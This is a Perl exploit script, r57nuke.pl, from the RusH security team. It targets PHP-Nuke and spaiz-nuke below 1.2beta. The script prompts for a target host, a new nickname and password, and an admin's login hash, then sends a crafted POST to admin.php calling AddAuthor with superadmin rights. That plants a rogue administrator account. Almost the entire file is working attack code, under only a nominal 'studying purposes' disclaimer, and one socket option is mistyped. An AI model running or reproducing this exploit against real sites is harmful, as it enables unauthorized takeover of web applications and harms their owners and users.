#!/usr/bin/perl 


     ############         ######################   ####################     
  ###################    ######################## ######################### 
 ###################### #####                #### ####    ##################
####               #### ####                ##### ######        ##     #####
###    ######       ########    ################# ################    ######
###    #######  ### ########    ################    ##############   ###### 
###   ##       ###############              ####       ########   #######   
###   #####    ########  ##################  ####    ########   #######     
###   #######    ######  ##################  ####    ######   #######       
###  ##########    ####  ####   ###########  ####   #####  ########         
### #####  ######  ####  #######          #######   #############           
########     ##########   ######################    ##########              
#######        ########     #################         ######                
                 #####  RusH security team  | http://www.rst.void.ru        


#   ******************************************************************
#   * r57nuke.pl                                                     *
#   * php-nuke all versions and spaiz-nuke version < 1.2beta xploit  *
#   ******************************************************************
#   * Эксплоит позволяющий добавить нового администратора со всеми   *
#   * правами зная лишь хэш логина и защифрованного пароля админа.   *
#   * Если вы не знаете как получить данный хэш читайте advisory#10  *
#   * на сайте rst.void.ru                                           *
#   ******************************************************************
#   * coded by 1dt.w0lf                                              *
#   * idtwolf@pisem.net                                              *
#   ******************************************************************
#   * gr33tz 2:                                                      *
#   * all russian hack/sec team                                      *
#   * all who known me =)                                            *
#   * UkR-XbIP visit site: UkR security team (http://ust.icqinfo.ru) *
#   * Krok visit site: VOID.RU (http://www.void.ru)                  *
#   ******************************************************************
#   *                                                                *
#   * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-        *
#   * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY        *
#   * DAMAGE DONE USING THIS PROGRAM.                                *
#   *                                                                *
#   ******************************************************************

use IO::Socket; 


print "Enter host (e.g. www.phpnuke.com): \r\n"; 
chomp($server=<STDIN>); 
# get new admin nick =)
print "Enter u nick (e.g. hacker): \r\n"; 
chomp($nick=<STDIN>); 
# get new admin pass =)
print "Enter u pass (e.g. password): \r\n"; 
chomp($pass=<STDIN>); 
# get admin hash =)
print "Enter hash (e.g. YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM6): \r\n"; 
chomp($hash=<STDIN>); 

$port="80";

$path="/admin.php?op=AddAuthor&add_radminsuper=1&add_name=$nick&add_aid=$nick&add_email=hacker@hacker.com&add_pwd=$pass&admin=$hash";

print "\r\nConnecting... "; 

$socket=IO::Socket::INET->new( PeerAddr => $server, PeerPort => $port, Photo => tcp) 
or die; 

print "OK \r\n"; 
print "exploiting... "; 

# send string to server

print $socket "POST $path HTTP/1.1\n"; 
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Referer: $server/admin.php\n";
print $socket "User-Agent: r57spaiz\n";
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";

print "OK \r\n"; 
print "now u can go to $server/admin.php and just use login $nick and password $pass for access \r\n";
 
